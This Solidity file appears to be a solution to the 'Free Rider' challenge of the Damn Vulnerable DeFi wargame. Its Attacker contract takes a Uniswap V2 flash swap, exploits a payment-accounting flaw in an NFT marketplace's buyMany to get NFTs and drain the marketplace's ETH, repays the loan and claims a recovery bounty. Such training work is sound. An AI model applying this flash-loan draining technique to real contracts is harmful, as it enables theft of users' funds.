// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import IWETH
import "solmate/src/tokens/WETH.sol";
// import uniswapv2 core UniswapV2Pair.sol
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableNFT.sol";

import "hardhat/console.sol";

contract Attacker is IUniswapV2Callee {
    uint256 constant BORROW_AMOUNT = 15 ether;
    IUniswapV2Pair private immutable _pair;
    FreeRiderNFTMarketplace private immutable _marketplace;
    FreeRiderRecovery private immutable _recovery;
    DamnValuableNFT private immutable _nft;
    WETH private immutable _weth;

    uint256[] private _nftids;

    constructor(
        IUniswapV2Pair pair,
        FreeRiderNFTMarketplace marketplace,
        FreeRiderRecovery recovery,
        DamnValuableNFT nft,
        WETH weth,
        uint256[] memory nftids
    ) {
        _pair = pair;
        _marketplace = marketplace;
        _recovery = recovery;
        _nft = nft;
        _weth = weth;
        _nftids = nftids;
    }

    function attack() external {
        // 1. flash loan 15 WETH from _pair
        // token0 should be weth
        _pair.swap(BORROW_AMOUNT, 0, address(this), bytes("1"));
        // check eth blance of this contract
        console.log("eth balance of this contract 1", address(this).balance);

        // 2. drain the remaining eth in _marketplace
        _drainTheRemain();

        // check eth blance of this contract
        console.log(
            "eth balance of this contract 2",
            address(this).balance / 10 ** 18
        );
        // 3.return all eth to msg.sender
        payable(msg.sender).transfer(address(this).balance);
        console.log("eth balance of this contract 3", address(this).balance);
    }

    function _drainTheRemain() internal {
        // now there must have more than 15 WETH in this contract
        // craft another offer to drain the remaining eth in makerplace
        uint256[] memory newids = new uint256[](2);
        newids[0] = _nftids[0];
        newids[1] = _nftids[1];

        uint256[] memory newprices = new uint256[](2);
        newprices[0] = BORROW_AMOUNT;
        newprices[1] = BORROW_AMOUNT;
        // approve tokenId to _marketplace
        _nft.setApprovalForAll(address(_marketplace), true);
        _marketplace.offerMany(newids, newprices);
        _marketplace.buyMany{value: newprices[0]}(newids);

        // check eth blance of this contract again
        uint256 ethBalance = address(this).balance;
        console.log("eth balance of this contract 2", ethBalance);

        // get the bounty from recovery contract
        // transfer all nfts from this contract to recover contract
        for (uint256 i = 0; i < _nftids.length; i++) {
            _nft.safeTransferFrom(
                address(this),
                address(_recovery),
                _nftids[i],
                abi.encode(address(this))
            );
        }
    }

    function uniswapV2Call(
        address initiator,
        uint256 amount0Out,
        uint256 amount1Out,
        bytes calldata data
    ) external {
        // check if the caller is _pair
        require(msg.sender == address(_pair), "caller is not _pair");
        console.log("amount0Out", amount0Out);
        // token0 should be weth
        // 0. convert WETH to ETH
        // approve _weth to spend amount0Out
        _weth.withdraw(amount0Out);
        // checke eth balance of this contract
        console.log("eth balance of this contract 0", address(this).balance);
        // 1. buy NFT from FreeRiderNFTMarketplace
        _marketplace.buyMany{value: amount0Out}(_nftids);
        console.log("eth balance of this contract 1", address(this).balance);
        // 3. convert ETH to WETH
        // calcaulate flash loan fee
        // uniswap v2 flash loan fee calculation refer to the offcical document:
        // https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps#single-token
        uint256 replayAmount = (amount0Out * 1000) / 997 + 1;

        _weth.deposit{value: replayAmount}();

        // 4. return flash loan
        _weth.transfer(address(_pair), replayAmount);
        console.log("replayAmount", replayAmount);
    }

    // receiver function
    receive() external payable {}

    // erc721 receiver implementation
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        console.log("onERC721Received", tokenId);
        return this.onERC721Received.selector;
    }
}
